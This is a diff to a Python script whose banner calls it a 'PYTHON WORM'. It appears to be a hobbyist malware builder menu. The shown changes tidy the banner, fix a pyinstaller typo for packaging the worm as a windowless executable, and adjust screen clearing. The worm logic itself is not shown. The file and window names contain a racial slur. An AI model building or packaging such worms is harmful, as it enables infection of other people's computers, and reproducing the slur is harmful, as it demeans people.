@@ -4,7 +4,6 @@ import time
 import shutil
 import win32con
 import win32gui
-import helikopter
 from os import system
 
 
@@ -22,13 +21,13 @@ def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))
 #function to print banner
 def banner_func():
 	prCyan ("""
-	         _____     _   _         _   _ _                       
-		|  ___|_ _| |_| |_ _   _| \ | (_) __ _  __ _  ___ _ __ 
-		| |_ / _` | __| __| | | |  \| | |/ _` |/ _` |/ _ \ '__|
-		|  _| (_| | |_| |_| |_| | |\  | | (_| | (_| |  __/ |   
-		|_|  \__,_|\__|\__|\__, |_| \_|_|\__, |\__, |\___|_|   
-         		           |___/         |___/ |___/           
-                                                          PYTHON WORM! """)
+	                 _____     _   _         _   _ _                       
+			|  ___|_ _| |_| |_ _   _| \ | (_) __ _  __ _  ___ _ __ 
+			| |_ / _` | __| __| | | |  \| | |/ _` |/ _` |/ _ \ '__|
+			|  _| (_| | |_| |_| |_| | |\  | | (_| | (_| |  __/ |   
+			|_|  \__,_|\__|\__|\__, |_| \_|_|\__, |\__, |\___|_|   
+         			           |___/         |___/ |___/           
+                                                        PYTHON WORM! """)
 
 #class containing worm code
 class Worm:
@@ -126,11 +125,7 @@ def worm_menu():
 #main function in python                        
 if __name__=="__main__":
 	#clearing screen
-	system('cls','clear')
-	
-	#setting title of exe app 
-    	system("title "+ "FattyNigger")
-    	time.sleep(3)  
+	system('cls')
 	
 	#calling banner function
 	banner_func()
@@ -163,7 +158,7 @@ if __name__=="__main__":
 			prGreen('[+] Creating EXE of WORM FattyNigger.py!')
 			time.sleep(2)
 			
-			os.system('pytinstaller fattynigger.py --onefile --noconsole')
+			os.system('pyinstaller fattynigger.py --onefile --noconsole')
 			prLightGray('[!] fattynigger.exe Created!')
 		
 		elif opt == 3:
@@ -192,6 +187,9 @@ if __name__=="__main__":
 			prBlack('[!] Try Again. ')
 
 			
-#going back to main tool			
-system('cls','clear')
+#clearing screen			
+system('cls')
+input()
+
+#going back to main tool
 os.system('python helikopter.py')
